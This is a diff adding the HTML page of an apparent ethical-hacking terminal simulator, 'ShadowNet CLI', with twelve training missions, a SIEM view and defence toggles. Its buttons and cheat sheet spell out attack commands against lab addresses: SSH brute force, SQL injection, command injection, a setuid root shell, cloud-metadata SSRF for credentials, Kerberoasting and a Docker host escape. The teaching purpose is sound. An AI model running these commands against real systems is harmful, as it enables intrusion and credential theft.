@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="matrix">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ShadowNet CLI // Ethical Hacking Terminal Simulator</title>
+    <link rel="icon" type="image/svg+xml" href="./favicon.svg" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="./src/style.css" />
+  </head>
+  <body class="cyber-body crt-scanlines">
+    <!-- CRT VIGNETTE & SCANLINE OVERLAYS -->
+    <div class="crt-overlay" id="crtOverlay"></div>
+
+    <!-- WORKSTATION CONTAINER (Exact 100vh lock) -->
+    <div class="app-container">
+      <!-- HEADER BAR -->
+      <header class="header-bar">
+        <div class="header-brand">
+          <div class="brand-glitch">
+            <span>⚡</span> SHADOWNET
+          </div>
+          <div class="brand-badge">
+            <span class="pulse-dot"></span>
+            <span>TUN0 SECURE</span>
+          </div>
+        </div>
+
+        <div class="header-intel">
+          <div class="intel-item">
+            <span class="intel-label">Target:</span>
+            <span class="intel-val" id="hudTarget">192.168.1.42</span>
+          </div>
+          <div class="intel-item intel-domain">
+            <span class="intel-label">Domain:</span>
+            <span class="intel-val">internal.stag-apex.corp</span>
+          </div>
+          <div class="intel-item">
+            <span class="intel-label">Rank:</span>
+            <span class="intel-val" id="hudRank">Level 1 // Script Kiddie</span>
+          </div>
+          <div class="intel-item">
+            <span class="intel-label">XP:</span>
+            <span class="intel-val" id="hudXp">0 / 6000 XP</span>
+          </div>
+        </div>
+
+        <div class="header-controls">
+          <!-- OPERATION SELECTOR -->
+          <select class="theme-select op-select" id="opSelector" title="Jump to Mission">
+            <option value="1">0x01: Recon (nmap)</option>
+            <option value="2">0x02: Web Fuzz (gobuster)</option>
+            <option value="3">0x03: SSH Brute (hydra)</option>
+            <option value="4">0x04: SQLi (sqlmap)</option>
+            <option value="5">0x05: Sudo Root (find)</option>
+            <option value="6">0x06: JWT Forgery (jwt-tool)</option>
+            <option value="7">0x07: RCE Shell (nc)</option>
+            <option value="8">0x08: Pivoting (chisel)</option>
+            <option value="9">0x09: Kerberoast (impacket)</option>
+            <option value="10">0x0A: Capabilities (python3)</option>
+            <option value="11">0x0B: Cloud SSRF (aws)</option>
+            <option value="12">0x0C: Docker Escape (docker)</option>
+          </select>
+          <button class="btn-ctrl btn-report" id="btnReport" title="Executive Pen-Test Report">
+            📄 Report
+          </button>
+          <button class="btn-ctrl" id="btnAudio" title="Toggle Sound FX">
+            <span id="audioIcon">🔊</span> Audio
+          </button>
+          <button class="btn-ctrl" id="btnCrt" title="Toggle CRT Scanline Effect">
+            📺 CRT
+          </button>
+          <select class="theme-select" id="themeSelector" title="Switch Color Theme">
+            <option value="matrix">Matrix Green</option>
+            <option value="cyber">Cyber Cyan</option>
+            <option value="amber">Amber Mainframe</option>
+            <option value="blood">Syndicate Red</option>
+          </select>
+        </div>
+      </header>
+
+      <!-- WORKSPACE MAIN GRID -->
+      <main class="main-workspace">
+        <!-- LEFT: PRIMARY VIEWPORT -->
+        <section class="primary-viewport">
+          <nav class="viewport-nav">
+            <div class="tab-group">
+              <button class="nav-tab active" data-tab="terminal">
+                <span>&gt;_</span> CLI Terminal
+                <span class="tab-badge">TTY1</span>
+              </button>
+              <button class="nav-tab" data-tab="topology">
+                <span>📡</span> Network Topology Radar
+                <span class="tab-badge" id="badgePorts">0 Ports</span>
+              </button>
+              <button class="nav-tab" data-tab="siem">
+                <span>🛡️</span> SOC SIEM
+                <span class="tab-badge badge-alert" id="badgeAlerts">0 Alerts</span>
+              </button>
+              <button class="nav-tab" data-tab="scratchpad">
+                <span>📝</span> Cyber Deck Notes
+              </button>
+            </div>
+
+            <div class="viewport-meta">
+              <span class="intel-label">SESSION:</span>
+              <span class="status-active" id="hudSession">guest@shadownet</span>
+            </div>
+          </nav>
+
+          <!-- TAB 1: TERMINAL -->
+          <div class="tab-content-pane active" id="pane-terminal">
+            <div class="terminal-wrapper">
+              <div class="term-container" id="terminal"></div>
+              <div class="term-quick-chips">
+                <span class="chip-label">QUICK ACTIONS:</span>
+                <button class="chip-btn" data-cmd="nmap 192.168.1.42">nmap 192.168.1.42</button>
+                <button class="chip-btn" data-cmd="nmap -sV 192.168.1.42">nmap -sV</button>
+                <button class="chip-btn" data-cmd="gobuster dir -u http://192.168.1.42 -w /usr/share/wordlists/dirb/common.txt">gobuster dir</button>
+                <button class="chip-btn" data-cmd="curl http://192.168.1.42/robots.txt">curl /robots.txt</button>
+                <button class="chip-btn" data-cmd="hydra -l devadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.42">hydra ssh</button>
+                <button class="chip-btn" data-cmd="ssh devadmin@192.168.1.42">ssh devadmin</button>
+                <button class="chip-btn" data-cmd="sqlmap -u &quot;http://192.168.1.42/search.php?query=test&quot; --dbs">sqlmap --dbs</button>
+                <button class="chip-btn" data-cmd="curl http://192.168.1.42/api/v1/auth">curl /api/v1/auth</button>
+                <button class="chip-btn" data-cmd="jwt-tool -X a">jwt-tool alg:none</button>
+                <button class="chip-btn" data-cmd="nc -lvnp 4444">nc listener</button>
+                <button class="chip-btn" data-cmd="curl &quot;http://192.168.1.42/api/v1/admin/ping?ip=127.0.0.1%0Aid&quot;">curl ping RCE</button>
+                <button class="chip-btn" data-cmd="chisel client 10.13.37.89:8000 R:socks">chisel socks</button>
+                <button class="chip-btn" data-cmd="proxychains nmap -sT 10.0.0.254">proxychains nmap</button>
+                <button class="chip-btn" data-cmd="proxychains impacket-GetUserSPNs stag-apex.corp/devadmin:apex2026! -dc-ip 10.0.0.254 -request">impacket SPN</button>
+                <button class="chip-btn" data-cmd="hashcat -m 13100 krb5_ticket /usr/share/wordlists/rockyou.txt">hashcat krb5</button>
+                <button class="chip-btn" data-cmd="ssh svc_mssql@10.0.0.254">ssh svc_mssql</button>
+                <button class="chip-btn" data-cmd="getcap -r / 2>/dev/null">getcap -r</button>
+                <button class="chip-btn" data-cmd="python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'">python3 cap root</button>
+                <button class="chip-btn" data-cmd="curl &quot;http://192.168.1.42/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ApexCloudRole&quot;">curl AWS SSRF</button>
+                <button class="chip-btn" data-cmd="aws s3 ls">aws s3 ls</button>
+                <button class="chip-btn" data-cmd="docker run -v /:/mnt/host alpine chroot /mnt/host">docker escape</button>
+                <button class="chip-btn" data-cmd="tcpdump -i tun0 -X">tcpdump -X</button>
+                <button class="chip-btn" data-cmd="report">report</button>
+                <button class="chip-btn" data-cmd="help">help</button>
+                <button class="chip-btn" data-cmd="hint">hint</button>
+                <button class="chip-btn" data-cmd="clear">clear</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- TAB 2: TOPOLOGY RADAR -->
+          <div class="tab-content-pane" id="pane-topology">
+            <div class="topology-container">
+              <div class="radar-canvas-box" id="radarBox"></div>
+              <div class="radar-intel-banner">
+                <div>
+                  <span class="intel-label">RADAR NODE:</span>
+                  <span id="radarNodeDetails" style="margin-left: 10px; color: var(--text-muted);">Status: Monitoring perimeter probes...</span>
+                </div>
+                <div>
+                  <span class="intel-label">CIRCUIT:</span>
+                  <span style="color: var(--accent-secondary);">10.13.37.89 ➔ 185.220.101.5 ➔ 192.168.1.42</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- TAB 3: SOC SIEM -->
+          <div class="tab-content-pane" id="pane-siem">
+            <div class="siem-container">
+              <div class="siem-header">
+                <div class="siem-title-box">
+                  <span class="pulse-dot" style="background: #ff0055; box-shadow: 0 0 10px #ff0055;"></span>
+                  <h3 style="font-family: 'Orbitron', monospace; font-size: 13px; letter-spacing: 1px; color: #fff;">
+                    LIVE SOC SIEM & THREAT DETECTION TELEMETRY
+                  </h3>
+                </div>
+                <div class="siem-summary-stats">
+                  <span class="stat-pill">Events: <strong id="siemTotalEvents">0</strong></span>
+                  <span class="stat-pill critical">Critical: <strong id="siemCritEvents">0</strong></span>
+                </div>
+              </div>
+
+              <div class="siem-split">
+                <div class="siem-feed-panel">
+                  <div class="siem-panel-title">LIVE INCIDENT DETECTION STREAM</div>
+                  <div class="siem-alert-feed" id="siemAlertFeed">
+                    <div class="siem-placeholder">Waiting for security events... Run commands in the CLI terminal to trigger real-time SIEM alerts.</div>
+                  </div>
+                </div>
+
+                <div class="siem-controls-panel">
+                  <div class="siem-panel-title">BLUE TEAM DEFENSIVE MITIGATIONS</div>
+                  <p class="siem-hint-text">Toggle enterprise security controls to observe how defenses mitigate attacks:</p>
+                  
+                  <div class="defense-toggle-item">
+                    <div class="defense-info">
+                      <span class="defense-name">Fail2Ban SSH Rate-Limiting</span>
+                      <span class="defense-desc">Jails brute-forcing IPs after 3 failed password attempts.</span>
+                    </div>
+                    <label class="switch">
+                      <input type="checkbox" id="toggleFail2ban">
+                      <span class="slider"></span>
+                    </label>
+                  </div>
+
+                  <div class="defense-toggle-item">
+                    <div class="defense-info">
+                      <span class="defense-name">ModSecurity Web Application Firewall</span>
+                      <span class="defense-desc">Blocks unescaped SQL injections & shell metacharacters.</span>
+                    </div>
+                    <label class="switch">
+                      <input type="checkbox" id="toggleWaf">
+                      <span class="slider"></span>
+                    </label>
+                  </div>
+
+                  <div class="defense-toggle-item">
+                    <div class="defense-info">
+                      <span class="defense-name">Linux Auditd SUID Hardening</span>
+                      <span class="defense-desc">Kernel filters prevent cap_setuid privilege escalation.</span>
+                    </div>
+                    <label class="switch">
+                      <input type="checkbox" id="toggleHardening">
+                      <span class="slider"></span>
+                    </label>
+                  </div>
+
+                  <div class="siem-status-card">
+                    <span class="intel-label">CURRENT POSTURE:</span>
+                    <span class="defense-status" id="socPostureText">Offensive Training Lab (Permissive)</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- TAB 4: CYBER DECK SCRATCHPAD -->
+          <div class="tab-content-pane" id="pane-scratchpad">
+            <div class="scratchpad-container">
+              <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span class="card-title">📝 FIELD AGENT SCRATCHPAD</span>
+                <span class="intel-label">Auto-saved to local memory</span>
+              </div>
+              <textarea class="scratchpad-area" id="scratchpadArea" placeholder="Capture flags, credentials, hashes, notes, or draft attack payloads here..."></textarea>
+            </div>
+          </div>
+        </section>
+
+        <!-- RIGHT: OPS INTEL HUD SIDEBAR -->
+        <aside class="ops-sidebar">
+          <!-- MISSION DOSSIER CARD -->
+          <div class="hud-card">
+            <div class="card-header">
+              <span class="card-title">🎯 ACTIVE MISSION</span>
+              <span class="mission-badge" id="missionCode">0x01</span>
+            </div>
+
+            <!-- SIDEBAR MISSION JUMP SELECTOR -->
+            <div style="margin: 4px 0 10px 0;">
+              <select class="theme-select sidebar-op-select" id="sidebarOpSelect" style="width: 100%;" title="Switch Mission">
+                <option value="1">0x01: Recon (nmap)</option>
+                <option value="2">0x02: Web Fuzz (gobuster)</option>
+                <option value="3">0x03: SSH Brute (hydra)</option>
+                <option value="4">0x04: SQLi (sqlmap)</option>
+                <option value="5">0x05: Sudo Root (find)</option>
+                <option value="6">0x06: JWT Forgery (jwt-tool)</option>
+                <option value="7">0x07: RCE Shell (nc)</option>
+                <option value="8">0x08: Pivoting (chisel)</option>
+                <option value="9">0x09: Kerberoast (impacket)</option>
+                <option value="10">0x0A: Capabilities (python3)</option>
+                <option value="11">0x0B: Cloud SSRF (aws)</option>
+                <option value="12">0x0C: Docker Escape (docker)</option>
+              </select>
+            </div>
+
+            <h2 class="mission-title" id="missionTitle">Target Reconnaissance</h2>
+            <p class="mission-desc" id="missionDesc">
+              Scan target 192.168.1.42 using nmap to discover perimeter ports and identify active attack vectors.
+            </p>
+
+            <div class="objectives-list" id="objectivesList"></div>
+
+            <!-- FLAG SUBMISSION FORM -->
+            <form class="flag-form" id="flagForm">
+              <input type="text" class="flag-input" id="flagInput" placeholder="Enter FLAG{...}" autocomplete="off" />
+              <button type="submit" class="flag-btn">SUBMIT</button>
+            </form>
+          </div>
+
+          <!-- TARGET INTEL & PORT SHIELDS CARD -->
+          <div class="hud-card">
+            <div class="card-header">
+              <span class="card-title">🛡️ PERIMETER SHIELDS</span>
+              <span class="intel-label" id="portsCountLabel">0 / 3 Discovered</span>
+            </div>
+            <div class="port-grid" id="portShieldsList">
+              <div class="port-card">
+                <span>Port 22/tcp - SSH</span>
+                <span class="port-badge-unknown" id="port-22-badge">UNKNOWN</span>
+              </div>
+              <div class="port-card">
+                <span>Port 80/tcp - HTTP</span>
+                <span class="port-badge-unknown" id="port-80-badge">UNKNOWN</span>
+              </div>
+              <div class="port-card">
+                <span>Port 3306/tcp - MySQL</span>
+                <span class="port-badge-unknown" id="port-3306-badge">UNKNOWN</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- TACTICAL HINTS DRAWER -->
+          <div class="hud-card">
+            <div class="card-header">
+              <span class="card-title">💡 TACTICAL HINTS</span>
+              <button class="btn-ctrl-sm" id="btnToggleHints">SHOW</button>
+            </div>
+            <div class="hint-block hidden" id="hintsBody"></div>
+          </div>
+
+          <!-- ARSENAL CHEAT SHEET -->
+          <div class="hud-card">
+            <div class="card-header">
+              <span class="card-title">⚔️ TOOL ARSENAL CHEAT SHEET</span>
+            </div>
+            <div class="cheat-list">
+              <div class="cheat-item" data-cmd="nmap -sV 192.168.1.42">
+                <span class="cheat-cmd">nmap -sV ...</span>
+                <span class="intel-label">Port Scan</span>
+              </div>
+              <div class="cheat-item" data-cmd="curl http://192.168.1.42/api/v1/auth">
+                <span class="cheat-cmd">curl /api/v1/auth</span>
+                <span class="intel-label">JWT Token</span>
+              </div>
+              <div class="cheat-item" data-cmd="jwt-tool -X a">
+                <span class="cheat-cmd">jwt-tool -X a</span>
+                <span class="intel-label">JWT alg:none</span>
+              </div>
+              <div class="cheat-item" data-cmd="nc -lvnp 4444">
+                <span class="cheat-cmd">nc -lvnp 4444</span>
+                <span class="intel-label">Listener</span>
+              </div>
+              <div class="cheat-item" data-cmd="chisel client 10.13.37.89:8000 R:socks">
+                <span class="cheat-cmd">chisel SOCKS5</span>
+                <span class="intel-label">Pivot Tunnel</span>
+              </div>
+              <div class="cheat-item" data-cmd="proxychains nmap -sT 10.0.0.254">
+                <span class="cheat-cmd">proxychains nmap ...</span>
+                <span class="intel-label">Vault Scan</span>
+              </div>
+              <div class="cheat-item" data-cmd="proxychains impacket-GetUserSPNs stag-apex.corp/devadmin:apex2026! -dc-ip 10.0.0.254 -request">
+                <span class="cheat-cmd">impacket SPN</span>
+                <span class="intel-label">Kerberoast</span>
+              </div>
+              <div class="cheat-item" data-cmd="getcap -r / 2>/dev/null">
+                <span class="cheat-cmd">getcap -r /</span>
+                <span class="intel-label">Capabilities</span>
+              </div>
+              <div class="cheat-item" data-cmd="curl &quot;http://192.168.1.42/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ApexCloudRole&quot;">
+                <span class="cheat-cmd">curl SSRF ...</span>
+                <span class="intel-label">AWS IMDS</span>
+              </div>
+              <div class="cheat-item" data-cmd="docker run -v /:/mnt/host alpine chroot /mnt/host">
+                <span class="cheat-cmd">docker escape ...</span>
+                <span class="intel-label">Host Chroot</span>
+              </div>
+              <div class="cheat-item" data-cmd="tcpdump -i tun0 -X">
+                <span class="cheat-cmd">tcpdump -i tun0 -X</span>
+                <span class="intel-label">Sniffer</span>
+              </div>
+              <div class="cheat-item" data-cmd="report">
+                <span class="cheat-cmd">report</span>
+                <span class="intel-label">Audit PDF</span>
+              </div>
+            </div>
+          </div>
+        </aside>
+      </main>
+
+      <!-- FOOTER STATUS BAR -->
+      <footer class="status-bar">
+        <div class="status-left">
+          <div class="status-tag">
+            <span>IP:</span>
+            <span class="status-active">10.13.37.89</span>
+          </div>
+          <div class="status-tag">
+            <span>TOR NODE:</span>
+            <span class="status-active" style="color: var(--accent-secondary);">185.220.101.5</span>
+          </div>
+          <div class="status-tag">
+            <span>ENCRYPTION:</span>
+            <span class="status-active">AES-256-GCM / SHA-512</span>
+          </div>
+        </div>
+        <div class="status-right">
+          <span>[Tab] Autocomplete</span>
+          <span>[Ctrl+C] Cancel</span>
+          <span>[Ctrl+L] Clear</span>
+          <span>[↑/↓] History</span>
+        </div>
+      </footer>
+    </div>
+
+    <!-- EXECUTIVE PEN-TEST REPORT MODAL -->
+    <div class="modal-overlay hidden" id="reportModal">
+      <div class="modal-inner" id="reportModalContainer"></div>
+    </div>
+
+    <!-- ENTRY SCRIPT -->
+    <script type="module" src="./src/main.js"></script>
+  </body>
+</html>
